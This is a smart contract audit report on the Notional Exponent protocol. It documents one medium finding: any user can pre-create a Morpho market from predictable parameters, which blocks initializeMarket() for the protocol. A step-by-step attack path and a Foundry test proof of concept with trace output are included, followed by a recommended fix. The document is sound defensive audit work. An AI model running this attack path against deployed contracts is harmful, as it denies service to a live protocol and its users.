# Introduction

A time-boxed security review of the **Notional Exponent** protocol was done by **0xodus**, with a focus on the security aspects of the application's smart contracts implementation.

# Disclaimer

A smart contract security review can never verify the complete absence of vulnerabilities. This is a time, resource and expertise bound effort where I try to find as many vulnerabilities as possible. I can not guarantee 100% security after the review or even if the review will find any problems with your smart contracts. Subsequent security reviews, bug bounty programs and on-chain monitoring are strongly recommended.

# Severity classification

| Severity               | Impact: High | Impact: Medium | Impact: Low |
| ---------------------- | ------------ | -------------- | ----------- |
| **Likelihood: High**   | Critical     | High           | Medium      |
| **Likelihood: Medium** | High         | Medium         | Low         |
| **Likelihood: Low**    | Medium       | Low            | Low         |

**Impact** - the technical, economic and reputation damage of a successful attack

**Likelihood** - the chance that a particular vulnerability gets discovered and exploited

**Severity** - the overall criticality of the risk

# Findings Summary

| ID     | Title                                                                                            | Severity | Status    |
| ------ | ------------------------------------------------------------------------------------------------ | -------- | --------- |
| [M-01] | Anyone Can Cause Denial of Service for Protocol Market Initialization via Predictable Parameters | Medium   | Confirmed |

# Detailed Findings

# [M-01] | Anyone Can Cause Denial of Service for Protocol Market Initialization via Predictable Parameters

## Summary

Insufficient validation on `MorphoLendingRouter::initializeMarket()` function will cause a DoS for protocol administrators as any user can create markets using publicly derivable parameters, preventing legitimate protocol markets initialization.

## Root Cause

In `MorphoLendingRouter.sol:40`, the `initializeMarket()` function directly calls `MORPHO.createMarket(marketParams(vault))` without checking if the market already exists. Since market parameters are predictable (vault addresses are public, there's only one IRM address according to Morpho docs and LLTV options are limited), any user can create the same market before the protocol does.

## Internal Pre-conditions

1. Protocol needs to deploy and initialize a market for a specific vault
2. Vault address is publicly known (deployed on-chain)
3. Market parameters follow predictable patterns (single IRM, limited LLTV options)

## External Pre-conditions

1. Morpho protocol's `createMarket()` function remains publicly accessible
2. Market parameters are deterministic and publicly derivable

## Attack Path

1. Protocol deploys a vault with a known address and plans to initialize a market
2. Any user can derive the market parameters:
   - **loanToken**: can be read from the vault and is mostly standard asset like USDT, USDC etc
   - **collateralToken**: The deployed vault address (publicly known)
   - **oracle**: Same as collateral token (vault address)
   - **irm**: Only one IRM address exists according to Morpho documentation
   - **lltv**: Limited options available (e.g., 0.86e18, 0.90e18, etc.) as outlined in the docs
3. User calls `MORPHO.createMarket()` directly with the predicted parameters
4. When protocol admin attempts to call `initializeMarket()`, the transaction reverts because the market already exists
5. Even if protocol uses a different LLTV to work around this, the same DoS can be repeated for all available LLTV options

This attack doesn't necessarily require timing or frontrunning - any user can create markets at any time using predictable parameters.

## Impact

The protocol suffers a Denial of Service where all market initialization transactions can be blocked indefinitely. Market creation is a critical operation for the protocol - if external parties can create markets first using predictable parameters, the protocol's critical functionality like entering positions cannot be accessed through the proper initialization flow. The limited LLTV options mean that even attempting workarounds by using different LLTVs can be systematically DoSed.

## Proof of Concept

Create a file in the tests folder and paste the following contract for testing:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.29;

import "./TestEnvironment.sol";
import { MorphoLendingRouter, MORPHO, MarketParams } from "src/routers/MorphoLendingRouter.sol";

contract POC0xodus is TestEnvironment {
    MorphoLendingRouter public lRouter;

    function deployYieldStrategy() internal virtual override {
        w = new MockWrapperERC20(ERC20(address(USDC)));
        o = new MockOracle(1e18);
        y = new MockYieldStrategy(
            address(USDC),
            address(w),
            0.001e18 // 0.1% fee rate
        );
        defaultDeposit = 10_000e6;
        defaultBorrow = 90_000e6;
        canInspectTransientVariables = true;
    }

    function setupLendingRouter(uint256 lltv) internal override returns (ILendingRouter l) { }

    function testMarketInitializeDoS0xodus() public {
        lRouter = new MorphoLendingRouter();

        address attacker = makeAddr("attacker");
        // Any user can predict the market parameters and create the market before the protocol
        // This doesn't require monitoring transactions - parameters are publicly derivable
        MarketParams memory marketParams = MarketParams({
            loanToken: address(USDC),
            collateralToken: address(y),
            oracle: address(y),
            irm: IRM,
            lltv: 860_000_000_000_000_000
        });
        vm.startPrank(attacker);
        MORPHO.createMarket(marketParams);

        vm.startPrank(owner);
        ADDRESS_REGISTRY.setLendingRouter(address(lRouter));
        // When the protocol tries to initialize the market, it will fail because the market already exists
        vm.expectRevert();
        MorphoLendingRouter(address(lRouter)).initializeMarket(address(y), IRM, 860_000_000_000_000_000);

        vm.stopPrank();
    }
}
```

The test will return the following output:

```
    ├─ [60814] MorphoLendingRouter::initializeMarket(TimelockUpgradeableProxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC, 860000000000000000 [8.6e17])
    │   ├─ [1073] TimelockUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [378] AddressRegistry::upgradeAdmin() [delegatecall]
    │   │   │   └─ ← [Return] 0x02479BFC7Dce53A02e26fE7baea45a0852CB0909
    │   │   └─ ← [Return] 0x02479BFC7Dce53A02e26fE7baea45a0852CB0909
    │   ├─ [7502] TimelockUpgradeableProxy::fallback() [staticcall]
    │   │   ├─ [327] MockYieldStrategy::asset() [delegatecall]
    │   │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [2226] 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb::createMarket(MarketParams({ loanToken: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, collateralToken: 0xc7183455a4C133Ae270771860664b6B7ec320bB1, oracle: 0xc7183455a4C133Ae270771860664b6B7ec320bB1, irm: 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC, lltv: 860000000000000000 [8.6e17] }))
    │   │   └─ ← [Revert] market already created
    │   └─ ← [Revert] market already created
    ├─ [0] VM::stopPrank()
```

## Recommendation

Add a check in `initializeMarket()` to verify if the market already exists before attempting to create it:

```solidity
function initializeMarket(address vault, address irm, uint256 lltv) external {
    require(ADDRESS_REGISTRY.upgradeAdmin() == msg.sender);
    // Cannot override parameters once they are set
    require(s_morphoParams[vault].irm == address(0));
    require(s_morphoParams[vault].lltv == 0);

    s_morphoParams[vault] = MorphoParams({ irm: irm, lltv: lltv });

    MarketParams memory mp = marketParams(vault);
    Id marketId = morphoId(mp);

    // Check if market already exists
    (, , , , uint128 lastUpdate, ) = MORPHO.market(marketId);
    if (lastUpdate == 0) {
        // Market doesn't exist, safe to create
        MORPHO.createMarket(mp);
    }
    // If market exists, we can continue with the initialization process
}
```
